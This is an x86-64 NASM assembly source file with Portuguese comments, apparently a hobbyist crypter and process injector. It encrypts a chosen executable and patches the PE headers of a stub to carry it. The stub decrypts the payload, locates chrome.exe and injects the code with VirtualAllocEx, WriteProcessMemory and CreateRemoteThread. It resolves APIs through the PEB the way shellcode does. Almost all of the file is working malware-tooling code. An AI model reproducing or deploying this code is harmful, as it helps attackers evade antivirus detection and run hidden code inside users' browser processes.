[BITS 64]

global WinMain

section .data
        TamArqProgram times 8 dq 0
        TamArqTarget times 8 dq 0
        bufferFileName times 32 db 0
        Buffer times 80000 db 0
        addressAlocado times 8 dq 0
        addressAlocadoEx times 8 dq 0
        handle times 8 dq 0
        entrypointTarget times 8 dq 0
section .text

WinMain:
    Start:
        ;***************
        ;**** START ****
        ;***************
        ;* By: Teuzero *
        ;***************

        add rsp, 0xfffffffffffffdf8; # Avoid Null Byte
        ; Obtem o endereço base do kernel32.dll 
        call Locate_kernel32
        call IAT
        call FinFunctionGetProcAddress
        call LoadLibraryA
        call LoadMsvcrt
        call PrintMsgConsole
        call PegaNomeDoaquivo
        call OpenFile
        mov rbp,rdi
        mov r10, rbp ; Arquivo alvo
        ;Nome do proprio programa
        mov rax, "T0.exe"
        add rsp, 0x20
        mov [rsp+0x10], rax
        xor rax, rax
        mov rax, [TamArqProgram]
        mov [TamArqTarget], rax
        call OpenFile
        call Data
        call codeModification
        call Encrypt
        call CriaArquivoEncriptado 
        call PrepareInject

        Encrypt:
                xor rcx,rcx
                xor rax,rax
                mov rdx, rbp
                mov rsi, rdi
                add rsi, r8
                add rsi, 0xC00
                mov r13,rsi
                EncryptLoop:
                        mov rax,[rdx]
                        not al
                        add al, 0x06
                        add al, 0x95
                        mov [rsi], byte al
                        add rsi, 0x01
                        add rdx, 0x01
                        inc rcx
                        cmp rcx, 0x7000
                        jne EncryptLoop  
        ret

        CriaArquivoEncriptado:
                ;Lookup fopen
                mov rax, "fopen"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30
        
                ;Abre arquivo
                mov rax, "e"
                push rax
                mov rax, "crypt.ex"
                push rax
                lea rcx, [rsp]
                mov rax, "wb"
                push rax
                lea rdx, [rsp]
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                mov rbx,rax
                add rsp, 0x10
                
                ;Lookup fwrite
                mov rax, "fwrite"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12, rax
                add rsp, 0x30

                ;call fwrite
                mov ecx, [TamArqProgram]
                mov edx, ecx
                mov r9, rbx
                mov r8d, 0x01
                mov rcx, rdi
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                add rsp, 0x08

                ;Lookup fclose
                mov rax, "fclose"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12, rax
                add rsp, 0x30

                ;call fclose
                sub rsp,0x30
                mov rcx, rbx
                call r12
                add rsp, 0x30
                add rsp, 0x18

                call Locate_kernel32
                call GetProcAddres
                ;Lookup ExitProcess
                mov rax, "ess"
                push rax
                mov rax, "ExitProc"
                push rax
                lea rdx, [rsp]
                mov rcx, r8
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30

                ;call ExitProcess
                call r12
        ret

        codeModification:
                mov rsi, rdi ;Aqruivo T0.exe
                add rsi, 0x3c
                mov rdx, [rsi]
                mov rsi, rdi
                shl rdx, 0x20
                shr rdx, 0x20
                add rsi, rdx ; PE
                add rsi, 0x50
                xor rbx,rbx
                mov rbx,[rsi]
                ;add rbx, 0x0000
                ;mov [rsi], ebx ;Altera SizeOfImage

                ;Altera numero das secoes
                mov rsi, rdi
                add rsi, rdx
                add rsi, 0x06
                mov [rsi], word 0x02

                ;Altera entry point
                mov rsi, rdi
                add rsi, rdx
                add rsi, 0x28
                mov [rsi],dword 0x159E 
        ret


        Data:
               
                mov rsi, rdi ;Aqruivo T0.exe
                add rsi, 0x3c
                mov rdx, [rsi]
                mov rsi, rdi
                shl rdx, 0x20
                shr rdx, 0x20
                add rsi, rdx ; PE
                add rsi, 0x130

                ;add rsi, 0x28
                ;mov rax, ".\B5"
                ;mov [rsi], rax
                add rsi, 0x08
                ;mov [rsi], dword 0x0004BBD

                ;Virtual Address
                sub rsi, 0x24
                xor rax,rax
                mov rax, [rsi]
                add eax, 0x1000
                add rsi, 0x24
                add rsi, 0x04
                ;mov [rsi], eax

                add rsi, 0x04
                ;Raw Size
                ;mov [rsi], dword 0x0004BBD
                ;mov rcx, [rsi]

                ;Raw Address
                sub rsi, 0x24
                mov rax, [rsi]
                xor rbx,rbx
                mov rbx, 0x2000
                add rax, rbx
                add rsi, 0x24
                add rsi, 0x04
                ;mov [rsi], eax
                mov r8, [rsi]

                add rsi, 0x04
                ;mov [rsi], dword 0x00000000
                add rsi, 0x04
                ;mov [rsi], dword 0x00000000
                add rsi, 0x02
                ;mov [rsi], word 0x0000
                add rsi, 0x02
                ;mov [rsi], word 0x0000
                add rsi, 0x04
                mov [rsi], dword 0x40000040
        ret        
         
        IAT:
        ; Código para chegar na tabela de endereco de exportacao
        mov ebx, [rbx+0x3C];# obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
        add rbx, r8;# Add defrerenced signature offset to kernel32 base. Store in RBX.
        mov r12, 0x88FFFFF;      
        shr r12, 0x14; 
        mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
        add rdx, r8;# RDX = kernel32.dll + RVA ExportTable = ExportTable Address
        mov r10d, [rdx+0x14]; # numero de funcoes
        xor r11, r11;# Zera R11 para ser usado 
        mov r11d, [rdx+0x20]; # AddressOfNames RVA
        add r11, r8;# AddressOfNames VMA
        ret

        ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
        FinFunctionGetProcAddress:
        mov rcx, r10; # Set loop counter
        kernel32findfunction:  
                jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
                xor ebx,ebx; # Zera EBX para ser usada
                mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
                add rbx, r8; # RBX = Nome da funcao VMA
                dec rcx; # Decrementa o loop em 1
                mov rax, 0x41636f7250746547; # GetProcA
                cmp [rbx], rax; # checa se rbx é igual a  GetProcA
                jnz kernel32findfunction;  
        
        ; Encontra o endereço da função de GetProcessAddress
        FunctionNameFound:                 
                ; We found our target
                xor r11, r11; 
                mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
                add r11, r8; # AddressOfNameOrdinals VMA
                ; Get the function ordinal from AddressOfNameOrdinals
                inc rcx; 
                mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
                ; Get function address from AddressOfFunctions
                xor r11, r11; 
                mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
                add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
                mov eax, [r11+4+r13*4]; # Get the function RVA.
                add rax, r8; # Add base address to function RVA
                mov r14, rax; # GetProcAddress to R14
        ret

        LoadLibraryA:
               ; pega o endereco LoadLibraryA usando GetProcAddress
                mov rcx, 0x41797261;  
                push rcx;  
                mov rcx, 0x7262694c64616f4c;  
                push rcx;  
                mov rdx, rsp; # joga o ponteiro da string LoadLibraryA para RDX
                mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
                sub rsp, 0x30; # Make some room on the stack
                call r14; # Call GetProcessAddress
                add rsp, 0x30; # Remove espaço locdo na pilha
                add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
                mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
        ret

        LoadMsvcrt:
                ; Load msvcrt.dll
                mov rax, "ll"
                push rax
                mov rax, "msvcrt.d"
                push rax
                mov rcx, rsp
                sub rsp, 0x30
                call rsi
                mov r15,rax
                add rsp, 0x30
                add rsp, 0x10
        ret

        PrintMsgConsole:
                ; Lookup printf
                mov rax, "printf"
                push rax
                mov rdx, rsp
                mov rcx, r15
                sub rsp, 0x30
                call r14
                add rsp, 0x30
                mov r12, rax
        
                ; call printf
                mov rax, ":"
                push rax
                mov rax, "[+] File"
                push rax
                lea rcx, [rsp]
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                add rsp, 0x18
        ret

        PegaNomeDoaquivo:
                ; Lookup scanf
                mov rax, "scanf"
                push rax
                mov rdx,rsp
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12, rax
                add rsp, 0x30
            
                ; call scanf
                lea rax, [rsp+0x20]
                mov rdx, rax
                mov rax, "%s"
                push rax
                lea rcx, [rsp]
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                add rsp, 0x10
        ret

        OpenFile:
                ;Lookup fopen
                mov rax, "fopen"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30
        
                ;Abre arquivo
                lea rcx, [rsp+0x20]
                mov rax, "rb"
                push rax
                lea rdx, [rsp]
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                mov rbx,rax
                add rsp, 0x10
        
        LocomoveParaOFimDoarquivo:
                ;Lookup fseek
                mov rax, "fseek"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30

                ;call fseek
                mov rcx, rbx
                mov r8d, dword 0x02        
                mov edx, dword 0x00
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                add rsp, 0x08
        
        GetSizeFile:
                ;Lookup ftell
                mov rax, "ftell"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                add rsp, 0x30
                mov r12,rax
        
                ;call ftell
                mov rcx, rbx
                sub rsp, 0x30
                call r12
                mov [TamArqProgram], rax
                add rsp,0x30
                mov rsi,rax
                add rsp, 0x08

        AlocaEspacoEmUmEndereco:
                ;Lookup malloc
                mov rax, "malloc"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30

                ;call malloc
                mov rcx, rsi
                sub rsp, 0x30
                call r12
                mov rdi, rax
                add rsp,0x30
                add rsp, 0x08

        MoveParaInicioDoArquivo:
                ;Lookup rewind
                mov rax, "rewind"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12, rax
                add rsp, 0x30
        
                ;call rewind
                mov rcx, rbx
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                add rsp, 0x08

        GravaOPEdoArquivoNoEnderecoAlocadoPorMalloc:
                ;Lookup fread
                mov rax, "fread"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12, rax
                add rsp, 0x30

                ;call fread
                mov edx,esi
                mov r9, rbx
                mov r8d, 0x01
                mov rcx, rdi
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                add rsp, 0x08

        FechaArquivo:
                ;Lookup fclose
                mov rax, "fclose"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12, rax
                add rsp, 0x30

                ;call fclose
                sub rsp,0x30
                mov rcx, rbx
                call r12
                add rsp, 0x30
                add rsp, 0x08
        ret
             
        ;locate_kernel32
        Locate_kernel32: 
                xor rcx, rcx; # Zera RCX
                mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
                mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
                mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
                lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
                xchg rax, rsi; # troca RAX,RSI
                lodsq; # Load qword at address (R)SI into RAX
                mov rbx, [rax + 0x20]; # RBX = Kernel32 base address
                mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
                ret
        
        ;locate_ntdll
        Locate_ntdll:        
                xor rcx, rcx; # Zera RCX
                mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
                mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
                mov rsi, [rax + 0x30]; # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
                mov rbx, [rsi +0x10]; # dll base ntdll
                mov r8, rbx; # Copia o endereco base da ntdll para o registrador R8
        ret

        LoadLibrary:        
                mov rcx, 0x41797261;  
                push rcx;  
                mov rcx, 0x7262694c64616f4c;  
                push rcx;  
                mov rdx, rsp; # joga o ponteiro de LoadLibraryA para RDX
                mov rcx, r8; # Copia endereco base do Kernel32 para RCX
                sub rsp, 0x30; # Make some room on the stack
                call r14; # Call GetProcessAddress
                add rsp, 0x30; # Remove espaço alocado na pilha
                add rsp, 0x10; # Remove a string LoadLibrary alocada 
                mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
        ret

        PrepareInject:
                push rbp
                mov rbp, rsp
                sub rsp, 0x160

                call Locate_kernel32
                call GetProcAddres
                mov rdi,r8
                ;Lookup VirtualAlloc
                mov rax, "lloc"
                push rax
                mov rax, "VirtualA"
                push rax
                lea rdx, [rsp]
                mov rcx, r8
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30
        
                ;call VirtualAlloc
                mov r9d, 0x04
                mov r8d, 0x1000
                mov edx, 0x20000
                mov ecx, 0x00
                sub rsp, 0x30
                call r12
                add rsp, 0x30
                mov rbx,rax
                
                xor rcx,rcx
                xor rdx,rdx
                mov rsi, 0x400000
                add rsi, 0x2c00
                LoopDecrypt:
                        mov rdx, [rsi]
                        sub dl, 0x95
                        sub dl, 0x06
                        not dl
                        mov [rax], byte dl
                        add rsi, 0x01
                        add rax, 0x01
                        inc rcx
                        cmp rcx, 0x7000
                        jne LoopDecrypt

        get_process_pid:
                push rbp
                mov rbp, rsp
                sub rsp, 0x160
                lea rbp, [rsp+0x80]
                 
                ;Lookup CreateToolhelp32Snapshot
                mov rax, "Snapshot"
                push rax
                mov rax, "olhelp32"
                push rax
                mov rax, "CreateTo"
                push rax
                mov [rsp+24], dword 0x00   

                lea rdx, [rsp]
                mov rcx, rdi
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30
                
                ;call CreateToolhelp32Snapshot
                mov edx, 0x00
                mov ecx, 0x02
                sub rsp, 0x30
                call r12
                mov [rbp+0xD8], rax
                add rsp, 0x30
                add rsp, 0x10

                ; pega o endereco LoadLibraryA usando GetProcAddress
                mov rcx, 0x41797261;  
                push rcx;  
                mov rcx, 0x7262694c64616f4c;  
                push rcx;  
                mov rdx, rsp; # joga o ponteiro da string LoadLibraryA para RDX
                mov rcx, rdi; # Copia o endereço base da Kernel32  para RCX
                sub rsp, 0x30; # Make some room on the stack
                call r14; # Call GetProcessAddress
                add rsp, 0x30; # Remove espaço locdo na pilha
                add rsp, 0x10; # Remove a string alocada de  LoadLibrary 
                mov rsi, rax; # Guarda o endereço de loadlibrary em RSI                

                ; Load msvcrt.dll
                mov rax, "ll"
                push rax
                mov rax, "msvcrt.d"
                push rax
                mov rcx, rsp
                sub rsp, 0x30
                call rsi
                mov r15,rax
                add rsp, 0x30
                add rsp, 0x10

                ;Lookup strcmp
                mov rax, "strcmp"
                push rax
                lea rdx, [rsp]
                mov rcx, r15
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30

                ;lookup Process32Next
                mov rax, "2Next"
                push rax
                mov rax, "Process3"
                push rax
                lea rdx, [rsp]
                mov rcx, rdi
                sub rsp, 0x30
                call r14
                mov r13,rax
                add rsp, 0x30
                
                mov rbp, rbx                
                call Locate_ntdll
                mov rbx,rbp

                ;Lookup ZwClose
                mov rax, "ZwClose"
                push rax
                lea rdx, [rsp]
                mov rcx, r8
                sub rsp, 0x30
                call r14
                mov r10,rax
                add rsp, 0x30
                
                lea rbp, [rsp+0x80]
                 
                mov rax, "xe"
                push rax
                mov rax, "chrome.e"
                push rax
                mov [rbp+0xF0], rsp
         
                mov eax, 0x130
                mov [rbp-0x60], eax
        ProcessNext:        
                lea rax, [rbp-0x60]
                add rax, 0x2c
                mov rdx,[rbp+0xF0]
                mov rcx, rax
                call r12
                test eax,eax
                jne FoundName
                        mov eax, [rbp-0x58]
                        jmp FimGetPid
                        FoundName:
                                lea rdx, [rbp-0x60]
                                mov rax, [rbp+0x100]
                                mov rcx,rax
                                call r13
                                test eax,eax
                                setne al
                                test al,al
                                jne ProcessNext
                                mov rax,[rbp-0x100]
                                mov rcx,rax
                                call r13

                        FimGetPid:
                                mov rbp,rax
                                add rsp, 0x160
                                add rsp, 0x10 
                        mov rdi,rbx
                        call Locate_kernel32
                        call LoadLibrary
                        mov rbx,rdi
                        loadKernelbase:
                                ; Load kernelbase.dll
                                mov rax, "se.dll"     
                                push rax
                                mov rax, "kernelba"
                                push rax
                                mov rcx, rsp
                                sub rsp, 0x30
                                call rsi
                                mov r15,rax
                                add rsp, 0x30
                                add rsp, 0x10

                        OpenProcess:
                                ;Lookup OpenProcess
                                mov rax, "ess"
                                push rax
                                mov rax, "OpenProc"
                                push rax
                                lea rdx, [rsp]
                                mov rcx, r15
                                sub rsp, 0x30
                                call r14
                                mov r12, rax
                                add rsp, 0x30

                                ;call OpenProcess
                                xor edx,edx
                                mov ecx, 0x2000000
                                mov r8, rbp
                                sub rsp, 0x30
                                call r12
                                mov rbp, rax
                                add rsp, 0x30
                                mov r13, rax
                                

                        VirtualAllocEx:
                                ;Lookup VirtualAllocEx
                                mov rax, "llocEx"
                                push rax
                                mov rax, "VirtualA"
                                push rax
                                lea rdx, [rsp]
                                mov rcx, r15
                                sub rsp, 0x30
                                call r14
                                mov r12, rax

                                mov r15, rbx
                                ;call VirtualAllocEx
                                xor rcx,rcx
                                xor rbx,rbx
                                mov rbx, 0x20000
                                mov r8d, ebx
                                xor edx,edx
                                mov rcx, r13
                                mov [rsp+0x20], dword 0x40
                                mov r9d, 0x1000
                                mov rbp, r13
                                call r12
                                mov rbx, r15
                                mov rdi,rax
                               
                                
                        call Locate_kernel32 
                        mov rbp,rbx
                        mov rsi, r13      
                        call GetProcAddres
                        mov rbx, r15
                        mov r15, r9

                        call LoadLibrary
                        mov r13, r15
                        ;Load kernelbase.dll
                        mov rax, "se.dll"     
                        push rax
                        mov rax, "kernelba"
                        push rax
                        mov rcx, rsp
                        sub rsp, 0x30
                        call rsi
                        mov r15,rax
                        add rsp, 0x30
                        add rsp, 0x10

                        ;delta
                        
                        


                        WriteProcess:
                                ;Lookup WriteProcessMemory
                                mov rax, "ry"
                                push rax
                                mov rax, "cessMemo"
                                push rax
                                mov rax, "WritePro"
                                push rax
                                lea rdx, [rsp]
                                mov rcx, r15
                                sub rsp, 0x30
                                call r14
                                mov r12, rax
                                add rsp, 0x30

                                ;call WriteProcessMemory

                                mov r15, rbx
                                xor rbx,rbx
                                mov rbx, 0x7000
                                mov r9d, ebx
                                xor r10,r10
                                mov r8,r15
                                mov rdx,rdi
                                xor r15,r15
                                mov [rsp+0x20],r15
                                mov rcx, r13
                                call r12
                                mov rbp, rax
                                add rsp, 0x30     
                               
                        call Locate_kernel32
                        CreateRemoteThread:
                                ;Lookup CreateRemoteThread
                                mov rax, "ad"
                                push rax
                                mov rax, "moteThre"
                                push rax
                                mov rax, "CreateRe"
                                push rax
                                lea rdx, [rsp]
                                mov rcx, r8
                                sub rsp, 0x30
                                call r14
                                add rsp, 0x30
                                mov r12,rax

                                ;call CreateRemoteThread
                                xor r15,r15
                                mov [rsp+0x30], r15
                                xor rbx,rbx
                                mov rbx,rdi
                                mov r9, rbx
                                mov dword [rsp+0x28],r15d
                                mov [rsp+0x20], r15d
                                xor rbx,rbx
                                xor r8d,r8d
                                xor edx,edx
                                mov rcx, r13
                                call r12
                        Exit:                             
                        ;lookup ExitProcess
                                mov rax, "ess"
                                push rax
                                mov rax, "ExitProc"
                                push rax
                                lea rdx, [rsp]
                                mov rcx, r8
                                sub rsp, 0x30
                                call r14
                                mov r12 ,rax
                                call r12
                        ret

        GetProcAddres:
                xor r11,r11
                xor r13,r13
                xor rcx, rcx; # Zera RCX
                mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
                mov rax, [rax + 0x18]; # 0x18  ProcessEnvironmentBlock.Ldr Offset
                mov rsi, [rax + 0x20]; # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
                lodsq; # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
                xchg rax, rsi; # troca RAX,RSI
                lodsq; # Load qword at address (R)SI into RAX
                mov rbx, [rax + 0x20] ; # RBX = Kernel32 base address
                mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
                  
                ; Código para chegar na tabela de endereco de exportacao
                mov ebx, [rbx+0x3C]; # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
                add rbx, r8; # Add defrerenced signature offset to kernel32 base. Store in RBX.
                mov r12, 0x88FFFFF;      
                shr r12, 0x14; 
                mov edx, [rbx+r12]; # Offset from PE32 Signature to Export Address Table (NULL BYTE)
                add rdx, r8; # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
                mov r10d, [rdx+0x14]; # numero de funcoes
                xor r11, r11; # Zera R11 para ser usado 
                mov r11d, [rdx+0x20]; # AddressOfNames RVA
                add r11, r8; # AddressOfNames VMA

        FinFunctionGetProcAddress2:
                mov rcx, r10; # Set loop counter
                kernel32findfunction2:  
                        jecxz FunctionNameFound2; # Percorra esta função até encontrarmos GetProcA
                        xor ebx,ebx; # Zera EBX para ser usada
                        mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
                        add rbx, r8; # RBX = Nome da funcao VMA
                        dec rcx; # Decrementa o loop em 1
                        mov rax, 0x41636f7250746547; # GetProcA
                        cmp [rbx], rax; # checa se rbx é igual a  GetProcA
                        jnz kernel32findfunction2;  
        
        ; Encontra o endereço da função de GetProcessAddress
        FunctionNameFound2:                 
                ; We found our target
                xor r11, r11; 
                mov r11d, [rdx+0x24]; # AddressOfNameOrdinals RVA
                add r11, r8; # AddressOfNameOrdinals VMA
                ; Get the function ordinal from AddressOfNameOrdinals
                inc rcx; 
                mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
                ; Get function address from AddressOfFunctions
                xor r11, r11; 
                mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
                add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
                mov eax, [r11+4+r13*4]; # Get the function RVA.
                add rax, r8; # Add base address to function RVA
                mov r14, rax; # GetProcAddress to R14
        ret
ret
